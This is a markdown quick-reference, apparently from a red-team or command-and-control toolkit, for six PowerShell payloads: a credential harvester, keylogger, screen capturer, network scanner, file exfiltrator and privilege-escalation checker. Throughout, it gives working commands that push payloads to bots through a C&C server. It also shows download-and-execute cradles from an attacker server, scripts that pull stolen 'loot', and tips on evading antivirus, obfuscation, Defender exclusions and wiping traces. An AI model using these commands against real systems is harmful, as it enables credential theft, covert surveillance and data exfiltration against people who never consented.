# Native Windows PowerShell Payloads - Quick Reference

## Overview

These payloads are **pure PowerShell** and require **NO Python installation** on the target. They work on any Windows system with PowerShell (Windows 7+, Server 2008+).

## Prerequisites on Target

- Windows 7+ / Server 2008+ (PowerShell 2.0+)
- PowerShell execution policy bypass (can be done inline)
- No additional software required

## Payload Summary

| Payload | Purpose | Output | Average Runtime |
|---------|---------|--------|-----------------|
| `windows_credential_harvester.ps1` | Extract passwords & credentials | Text file + DB copies | 10-30 seconds |
| `windows_keylogger.ps1` | Capture keystrokes | Text file | Continuous (configurable) |
| `windows_screenshot.ps1` | Screen surveillance | PNG images | Continuous (configurable) |
| `windows_network_scanner.ps1` | Network reconnaissance | Text file | 1-5 minutes |
| `windows_file_exfiltrator.ps1` | Collect sensitive files | Directory + ZIP | 1-10 minutes |
| `windows_privesc_checker.ps1` | Find privilege escalation vectors | Text file | 30-60 seconds |

---

## Deployment Methods

### Method 1: Via C&C (Recommended)

**Upload payload:**
```bash
curl -X POST http://YOUR_CNC:5000/upload_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "local_path": "payloads/windows_credential_harvester.ps1", "remote_path": "C:\\Temp\\harvest.ps1"}'
```

**Execute payload:**
```bash
curl -X POST http://YOUR_CNC:5000/send_command \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\harvest.ps1 -Silent"}'
```

**Download results:**
```bash
curl -X POST http://YOUR_CNC:5000/download_file \
  -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "remote_path": "C:\\Temp\\harvested_credentials", "local_path": "./loot/"}'
```

### Method 2: Direct Remote Execution

**Via PSRemoting:**
```powershell
Invoke-Command -ComputerName TARGET -FilePath .\payloads\windows_credential_harvester.ps1
```

**Via WMI:**
```powershell
wmic /node:TARGET process call create "powershell -ExecutionPolicy Bypass -File C:\Temp\harvest.ps1"
```

### Method 3: Download and Execute

```powershell
# Download from C&C web server
IEX(New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/windows_credential_harvester.ps1')

# Or save and run
(New-Object Net.WebClient).DownloadFile('http://YOUR_SERVER/harvest.ps1', 'C:\Temp\harvest.ps1')
powershell -ExecutionPolicy Bypass -File C:\Temp\harvest.ps1
```

### Method 4: Embedded in Commands

**Inline execution (no file written):**
```powershell
powershell -ExecutionPolicy Bypass -Command "& { $code = (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/harvest.ps1'); Invoke-Expression $code }"
```

---

## Payload Usage Examples

### 1. Windows Credential Harvester

**Basic usage:**
```powershell
.\windows_credential_harvester.ps1
```

**Custom output directory:**
```powershell
.\windows_credential_harvester.ps1 -OutputDir "C:\Temp\loot"
```

**Silent mode (no console output):**
```powershell
.\windows_credential_harvester.ps1 -Silent
```

**What it collects:**
- Browser passwords (Chrome, Edge, Firefox) - copies databases
- WiFi passwords with SSIDs
- Windows Credential Manager entries
- Registry stored credentials
- SSH keys from ~/.ssh
- RDP saved connections
- Environment variables with secrets
- PowerShell command history
- Recent files list

**Output:**
- `credentials_TIMESTAMP.txt` - Main report
- `chrome_login_data*.db` - Browser credential databases
- `edge_login_data.db` - Edge credentials
- `firefox_logins_*.json` - Firefox credentials
- `ssh_*` - SSH key copies
- `powershell_history.txt` - Command history

---

### 2. Windows Keylogger

**Basic usage (5 minutes):**
```powershell
.\windows_keylogger.ps1
```

**Custom duration (30 minutes):**
```powershell
.\windows_keylogger.ps1 -Duration 1800
```

**Custom output file:**
```powershell
.\windows_keylogger.ps1 -OutputFile "C:\Temp\keys.txt" -Duration 600
```

**Silent background mode:**
```powershell
Start-Job { .\windows_keylogger.ps1 -Silent -Duration 3600 }
```

**Features:**
- Captures all keystrokes with timestamps
- Tracks active window titles
- Handles special keys (Enter, Backspace, etc.)
- Supports shift/caps lock for proper capitalization
- Session start/end markers

**Output format:**
```
[2025-11-04 14:23:15] [Chrome - Gmail] username@email.com
[2025-11-04 14:23:20] [Chrome - Gmail] [TAB]P@ssw0rd123[ENTER]
```

---

### 3. Windows Screenshot

**Basic usage (10 screenshots, 60 second interval):**
```powershell
.\windows_screenshot.ps1
```

**Custom settings:**
```powershell
.\windows_screenshot.ps1 -OutputDir "C:\Temp\screens" -Interval 30 -Count 20
```

**Continuous capture (infinite):**
```powershell
.\windows_screenshot.ps1 -Count 0 -Interval 120
```

**Background job:**
```powershell
Start-Job { .\windows_screenshot.ps1 -Silent -Count 50 -Interval 60 }
```

**Features:**
- Captures full screen as PNG
- Records active window title for context
- Tracks timestamp, resolution, username
- Creates session info file
- Minimal CPU/memory usage

**Output:**
- `screenshot_YYYYMMDD_HHMMSS.png` - Each screenshot
- `capture_info.txt` - Session metadata and log

---

### 4. Windows Network Scanner

**Auto-detect local network:**
```powershell
.\windows_network_scanner.ps1
```

**Scan specific network:**
```powershell
.\windows_network_scanner.ps1 -Network "10.0.0.0/24"
```

**With port scanning:**
```powershell
.\windows_network_scanner.ps1 -PortScan
```

**Custom ports:**
```powershell
.\windows_network_scanner.ps1 -PortScan -Ports @(21,22,80,443,445,3389,5985)
```

**Fast scan (shorter timeout):**
```powershell
.\windows_network_scanner.ps1 -PortScan -Timeout 500
```

**Features:**
- Multi-threaded host discovery (50 threads)
- Ping sweep across /24 network
- Optional port scanning
- Hostname resolution
- MAC address retrieval
- Response time measurement

**Output:**
```
Host: 192.168.1.10
Hostname: desktop-pc01.local
MAC Address: AA:BB:CC:DD:EE:FF
Response Time: 5 ms
Open Ports: 80, 443, 3389
```

---

### 5. Windows File Exfiltrator

**Search user profile:**
```powershell
.\windows_file_exfiltrator.ps1
```

**Search specific path:**
```powershell
.\windows_file_exfiltrator.ps1 -SearchPath "C:\Projects"
```

**Custom file types:**
```powershell
.\windows_file_exfiltrator.ps1 -FileTypes @("*.docx", "*.xlsx", "*confidential*", "*.key")
```

**With archiving:**
```powershell
.\windows_file_exfiltrator.ps1 -CreateArchive
```

**Content-based search:**
```powershell
.\windows_file_exfiltrator.ps1 -SearchContent -Keywords @("password", "secret", "api_key", "token")
```

**Complete example:**
```powershell
.\windows_file_exfiltrator.ps1 -SearchPath "$env:USERPROFILE\Documents" `
  -OutputDir "C:\Temp\exfil" `
  -FileTypes @("*.pdf", "*.docx", "*password*") `
  -MaxSizeMB 100 `
  -MaxFiles 200 `
  -CreateArchive `
  -SearchContent `
  -Keywords @("confidential", "password", "secret")
```

**Features:**
- Pattern-based file search
- File size filtering
- Maintains directory structure
- Optional ZIP archiving
- Content keyword search (text files)
- Detailed report generation

**Output:**
- `exfiltrated_data/` - Collected files in original structure
- `exfiltration_report_TIMESTAMP.txt` - Detailed file list
- `exfiltrated_data_TIMESTAMP.zip` - Archive (if -CreateArchive)

---

### 6. Windows Privilege Escalation Checker

**Basic scan:**
```powershell
.\windows_privesc_checker.ps1
```

**Custom output:**
```powershell
.\windows_privesc_checker.ps1 -OutputFile "C:\Temp\privesc.txt"
```

**Silent mode:**
```powershell
.\windows_privesc_checker.ps1 -Silent
```

**What it checks:**
1. **AlwaysInstallElevated** - MSI installs with SYSTEM privileges
2. **Unquoted Service Paths** - Services with spaces and no quotes
3. **Writable Service Binaries** - Service executables modifiable by user
4. **Writable Service Registry** - Service registry keys with weak ACLs
5. **Scheduled Tasks** - Tasks with writable binaries
6. **Writable PATH Directories** - DLL hijacking opportunities
7. **SeImpersonatePrivilege** - Token impersonation (Potato attacks)
8. **SeAssignPrimaryTokenPrivilege** - Token creation privileges
9. **SeBackupPrivilege** - Backup operator privileges
10. **Registry Passwords** - Credentials stored in registry
11. **Saved Credentials** - Windows Credential Manager entries
12. **Vulnerable Software** - Applications that may store credentials
13. **Startup Folders** - Writable startup directories
14. **Weak Folder Permissions** - Writable Program Files folders

**Output format:**
```
[HIGH] AlwaysInstallElevated
Description: AlwaysInstallElevated is enabled in both HKCU and HKLM
Details: MSI packages can be installed with SYSTEM privileges

[MEDIUM] Unquoted Service Paths
Description: Found 3 services with unquoted paths containing spaces
Details:
VulnService: C:\Program Files\Vulnerable Service\service.exe
```

---

## Integration with C&C Server

### Complete Workflow Example

**1. Upload all payloads to target:**
```bash
for payload in windows_credential_harvester windows_keylogger windows_screenshot windows_network_scanner windows_file_exfiltrator windows_privesc_checker; do
  curl -X POST http://YOUR_CNC:5000/upload_file -H "Content-Type: application/json" \
    -d "{\"bot_id\": \"target\", \"local_path\": \"payloads/${payload}.ps1\", \"remote_path\": \"C:\\\\Temp\\\\${payload}.ps1\"}"
done
```

**2. Run reconnaissance:**
```bash
# Check for privesc vectors
curl -X POST http://YOUR_CNC:5000/send_command -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\windows_privesc_checker.ps1"}'

# Scan network
curl -X POST http://YOUR_CNC:5000/send_command -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\windows_network_scanner.ps1 -PortScan"}'
```

**3. Harvest credentials:**
```bash
curl -X POST http://YOUR_CNC:5000/send_command -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\windows_credential_harvester.ps1"}'
```

**4. Start surveillance (background):**
```bash
# Keylogger (1 hour)
curl -X POST http://YOUR_CNC:5000/send_command -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "Start-Job { powershell -ExecutionPolicy Bypass -File C:\\Temp\\windows_keylogger.ps1 -Duration 3600 -Silent }"}'

# Screenshots (50 captures, 2 min interval)
curl -X POST http://YOUR_CNC:5000/send_command -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "Start-Job { powershell -ExecutionPolicy Bypass -File C:\\Temp\\windows_screenshot.ps1 -Count 50 -Interval 120 -Silent }"}'
```

**5. Exfiltrate sensitive files:**
```bash
curl -X POST http://YOUR_CNC:5000/send_command -H "Content-Type: application/json" \
  -d '{"bot_id": "target", "command": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\windows_file_exfiltrator.ps1 -CreateArchive"}'
```

**6. Download all results:**
```bash
# Create download script
cat > download_loot.sh << 'EOF'
#!/bin/bash
CNC="http://YOUR_CNC:5000"
BOT="target"

# Download credential harvest results
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Temp\\\\harvested_credentials\", \"local_path\": \"./loot/credentials/\"}"

# Download keylogger output
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Temp\\\\keylog.txt\", \"local_path\": \"./loot/keylog.txt\"}"

# Download screenshots
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Temp\\\\screenshots\", \"local_path\": \"./loot/screenshots/\"}"

# Download network scan
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Temp\\\\network_scan.txt\", \"local_path\": \"./loot/network_scan.txt\"}"

# Download exfiltrated files archive
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Temp\\\\exfiltrated_data_*.zip\", \"local_path\": \"./loot/exfiltrated.zip\"}"

# Download privesc report
curl -X POST $CNC/download_file -H "Content-Type: application/json" \
  -d "{\"bot_id\": \"$BOT\", \"remote_path\": \"C:\\\\Temp\\\\privesc_findings.txt\", \"local_path\": \"./loot/privesc.txt\"}"
EOF

chmod +x download_loot.sh
./download_loot.sh
```

---

## OPSEC Tips

### Avoid Detection

1. **Use -Silent parameter** to suppress console output
2. **Run as background jobs** with `Start-Job` to avoid blocking terminal
3. **Randomize output paths** to avoid signature detection
4. **Clean up after execution** - delete payloads and output files
5. **Obfuscate scripts** using PowerShell encoders before deployment

### Cleanup Commands

```powershell
# Stop background jobs
Get-Job | Stop-Job
Get-Job | Remove-Job

# Delete payloads
Remove-Item C:\Temp\windows_*.ps1 -Force

# Delete output
Remove-Item C:\Temp\harvested_credentials -Recurse -Force
Remove-Item C:\Temp\keylog.txt -Force
Remove-Item C:\Temp\screenshots -Recurse -Force
Remove-Item C:\Temp\*.txt -Force
Remove-Item C:\Temp\*.zip -Force

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

---

## Troubleshooting

**"Execution Policy" error:**
```powershell
# Always use -ExecutionPolicy Bypass
powershell -ExecutionPolicy Bypass -File script.ps1
```

**"Access Denied" errors:**
- Run payloads as current user first (many don't need admin)
- For admin-required actions, use privilege escalation vectors found by privesc checker

**Browser databases locked:**
- Credential harvester copies the databases (which works even if browser is open)
- Actual password extraction requires additional tools offline

**Antivirus detection:**
- Obfuscate scripts before deployment
- Rename functions and variables
- Use in-memory execution when possible
- Consider using Windows Defender exclusions if you have admin access

**Network not detected:**
- Manually specify with `-Network` parameter
- Check network adapter configuration

---

## Quick Command Reference

```powershell
# Harvest everything
.\windows_credential_harvester.ps1 -Silent

# Keylog for 30 minutes
.\windows_keylogger.ps1 -Duration 1800 -Silent

# Take 20 screenshots every 2 minutes
.\windows_screenshot.ps1 -Count 20 -Interval 120 -Silent

# Full network scan with ports
.\windows_network_scanner.ps1 -PortScan

# Collect documents and create archive
.\windows_file_exfiltrator.ps1 -CreateArchive -SearchContent

# Check privilege escalation vectors
.\windows_privesc_checker.ps1

# Run everything in background
Start-Job { .\windows_credential_harvester.ps1 -Silent }
Start-Job { .\windows_keylogger.ps1 -Duration 1800 -Silent }
Start-Job { .\windows_screenshot.ps1 -Count 20 -Interval 120 -Silent }
```

---

**For Python-based payloads, see [PAYLOAD_QUICK_REF.md](PAYLOAD_QUICK_REF.md)**

**For comprehensive deployment guide, see [RED_TEAM_GUIDE.md](RED_TEAM_GUIDE.md)**
